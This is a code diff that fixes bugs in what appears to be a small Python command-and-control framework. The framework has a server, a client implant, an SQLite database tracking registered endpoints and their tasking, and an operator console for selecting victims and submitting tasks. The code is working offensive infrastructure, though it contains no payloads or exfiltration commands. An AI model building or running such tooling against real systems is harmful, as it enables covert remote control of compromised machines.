@@ -29,8 +29,9 @@ CREATE_ENDPOINT_TABLE_SQL = """ CREATE TABLE IF NOT EXISTS endpoints (
 
 CREATE_TASKING_TABLE_SQL =  """ CREATE TABLE IF NOT EXISTS tasking (
                                 id integer PRIMARY KEY,
+                                endpoint text NOT NULL,
                                 uuid text NOT NULL,
-                                task NOT NULL,
+                                task text NOT NULL,
                                 results text,
                                 created text NOT NULL,
                                 updated text
@@ -123,6 +124,7 @@ class C2Client:
             while data:
                 received_data += data
                 data = sock.recv(1024)
+                logger.debug(data)
         response_decoded = json.loads(received_data.decode())
         return response_decoded
     
@@ -198,11 +200,11 @@ class C2Database:
     def add_tasking(self, endpoint: uuid, tasking: json) -> str:
         # add tasking to db
         # return task ID
-        new_task_id = uuid.uuid4()
-        created_date = datetime.datetime.now().isoformat()
-        query = '''INSERT INTO tasking(uuid,task,created) 
-                    Values(?,?,?) '''
-        self.db_cursor.execute(query,(new_task_id, json.dumps(tasking), created_date))
+        new_task_id = str(uuid.uuid4())
+        created_date = str(datetime.datetime.now().isoformat())
+        query = '''INSERT INTO tasking(uuid,endpoint,task,created) 
+                    Values(?,?,?,?) '''
+        self.db_cursor.execute(query,(new_task_id, str(endpoint), json.dumps(tasking), created_date))
         return new_task_id
 
     def add_results(self, task_id: str, task_results: str):
@@ -238,7 +240,7 @@ class C2Database:
         # add new endpoint, give it a UUID, add to endpoints table
         # returns UUID (uuid.uuid4())
         new_uuid = str(uuid.uuid4())
-        first_callback = int(datetime.datetime.now().isoformat())
+        first_callback = str(datetime.datetime.now().isoformat())
         last_callback = first_callback
         query = '''INSERT INTO endpoints(uuid,hostname,first_callback,last_callback,last_ip) Values(?,?,?,?,?)'''
         data = (new_uuid, hostname, first_callback, last_callback, last_ip)
@@ -257,7 +259,8 @@ class C2Database:
         query = "SELECT uuid from endpoints;"
         self.db_cursor.execute(query)
         endpoints = self.db_cursor.fetchall()
-        return endpoints.split()
+        logger.debug(endpoints)
+        return endpoints
 
 
 
@@ -298,9 +301,9 @@ class C2Operator:
         request = {}
         request["type"] = "operator"
         request["action"] = "list_clients"
-        self.clients_list = self.c2_server_transaction(server_message=request)
+        self.clients_list = self.c2_server_transaction(server_message=request)["response"]
         for client in self.clients_list:
-            print(f"client UUID: {client}")
+            print(f"client UUID: {client[0]}")
         
     def select_client(self):
         # dump latest list of clients and have user select number
@@ -308,12 +311,14 @@ class C2Operator:
         while not valid_selection:
             print("### Client List ###")
             for index, client in enumerate(self.clients_list):
-                print(f"{index + 1}:\t{client}")
+                print(f"{index + 1}:\t{client[0]}")
             print("###################")
             try:
                 selection = int(input("Select a client, or 0 to exit: "))
-                if selection >0 and selection <=len(self.clients_list):
-                    self.active_client = self.clients_list[selection - 1]
+                if selection > 0 and selection <=len(self.clients_list):
+                    self.active_client = self.clients_list[selection - 1][0]
+                    print(f"selected {self.active_client}")
+                    valid_selection = True
                 elif selection == 0:
                     valid_selection = True
             except ValueError:
@@ -346,12 +351,12 @@ class C2Operator:
 
     def prompt_user_input(self) -> str:
         # ask user to select from actions to take
-        menu = """Select option:\
-            1) list clients\
-            2) select client
-            3) query client tasking\
-            4) submit tasking\
-            5) quit\
+        menu = """Select option:\n
+            1) list clients\n
+            2) select client\n
+            3) query client tasking\n
+            4) submit tasking\n
+            5) quit\n
             Choice: """
         
         while True:
@@ -370,11 +375,10 @@ class C2Operator:
             received_data = b""
             sock.connect((self.server,self.port))    
             sock.sendall(json.dumps(server_message).encode())
-            data = sock.recv(1024)
-            while data:
-                received_data += data
-                data = sock.recv(1024)
-        response_decoded = json.loads(received_data.decode())
+            data = sock.recv(4096)
+            logger.debug(data)
+        response_decoded = json.loads(data.decode())
+        logger.debug(f"Closing connection to {self.server}:{self.port}")
         return response_decoded
                 
 
@@ -451,9 +455,6 @@ class C2Server:
             # logger.debug(data_buffer)
             if data_buffer:
                 data.outb += data_buffer
-                inbound_data += data_buffer.decode()
-                logger.debug(data_buffer)
-                inbound_message = json.loads(inbound_data)
             else:
                 # process what we read and prepare response
                 logger.info(f"Closing connection to {data.addr}")
@@ -466,7 +467,8 @@ class C2Server:
                 logger.debug(f"processing {inbound_data}")
                 inbound_message = json.loads(inbound_data)
                 response = self.process_tasking(inbound_message).encode()
-                sock.send(response)       
+                sock.send(response)
+                data.outb = None
                 
 
     def set_up_listener(self, host: ip_address, port: int) -> socket.socket:
@@ -494,7 +496,7 @@ class C2Server:
         #  client: register_endpoint, get_tasks, put_results, 
         action = message["action"]
         endpoint_id = message.get("endpoint_id", None)
-        response = {}
+        response = {"action":None, "response": {}}
 
         # these actions should really be defined in a YAML somewhere.  If this module grows this part can get unwieldy
 
@@ -518,6 +520,7 @@ class C2Server:
             src_ip = message["info"]["ip"]
             hostname = message["info"]["hostname"]
             response["action"] = "register_endpoint_response"
+            response["response"]
             response["response"]["endpoint_id"] =  self.db_conn.register_endpoint(hostname=hostname, last_ip=src_ip)
             logger.debug(f"registered endpoint IP: {src_ip}")
         elif message_type == "client" and action == "get_tasks":
@@ -581,7 +584,7 @@ def main():
         client.run()
     else:
         operator = C2Operator(c2_method=None, port=args.operator_port, server=args.server_ip)
-        operator.run_console
+        operator.run_console()
 
 
 if __name__ == "__main__":
